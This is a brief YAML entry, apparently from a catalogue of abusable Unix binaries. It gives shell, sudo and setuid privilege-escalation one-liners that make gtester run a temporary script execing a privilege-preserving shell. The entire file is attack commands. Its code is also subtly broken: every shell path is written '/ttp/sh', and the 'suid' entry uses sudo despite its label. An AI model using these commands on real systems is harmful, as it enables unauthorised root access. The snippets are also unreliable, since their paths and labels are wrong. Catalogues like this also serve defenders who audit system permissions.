---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo '#!/ttp/sh' > $TF
        echo 'exec /ttp/sh -p 0<&1' >> $TF
        chmod +x $TF
        gtester -q $TF
  sudo:
    - code: |
        TF=$(mktemp)
        echo '#!/ttp/sh' > $TF
        echo 'exec /ttp/sh 0<&1' >> $TF
        chmod +x $TF
        sudo gtester -q $TF
  suid:
    - code: |
        TF=$(mktemp)
        echo '#!/ttp/sh -p' > $TF
        echo 'exec /ttp/sh -p 0<&1' >> $TF
        chmod +x $TF
        sudo gtester -q $TF
---
